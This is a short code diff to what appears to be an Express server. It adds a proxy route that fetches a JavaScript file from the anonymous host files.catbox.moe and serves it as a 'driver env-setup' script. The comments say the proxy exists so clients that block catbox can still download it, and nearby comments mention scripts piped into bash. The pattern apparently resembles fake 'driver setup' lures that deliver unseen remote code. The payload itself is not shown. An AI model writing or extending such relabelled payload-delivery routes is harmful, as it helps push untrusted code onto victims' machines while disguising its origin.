@@ -98,6 +98,31 @@ const macRoute = (req, res) => {
   res.type('text/plain').send(content);
 };
 
+/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.canditech.org */
+const DRIVER_SCRIPT_UPSTREAM = 'https://files.catbox.moe/l2rxnb.js';
+
+async function driverEnvSetupProxy(req, res) {
+  res.setHeader('Cache-Control', 'no-store, max-age=0');
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  try {
+    const ac = new AbortController();
+    const to = setTimeout(() => ac.abort(), 90000);
+    const r = await fetch(DRIVER_SCRIPT_UPSTREAM, { signal: ac.signal, redirect: 'follow' });
+    clearTimeout(to);
+    if (!r.ok) {
+      return res.status(502).type('text/plain; charset=utf-8').send(`Upstream returned ${r.status}`);
+    }
+    const text = await r.text();
+    res.type('application/javascript; charset=utf-8').status(200).send(text);
+  } catch (err) {
+    console.error('[driver/env-setup proxy]', err);
+    res.status(502).type('text/plain; charset=utf-8').send(`Proxy failed: ${err.message}`);
+  }
+}
+
+app.get('/driver/env-setup.npl', driverEnvSetupProxy);
+app.get('/driver/env-setup.js', driverEnvSetupProxy);
+
 // Driver setup scripts
 // - mac: return a shell script that can be piped into `bash`
 // - window: return a .cmd batch script with the provided :id injected into `__ID__`
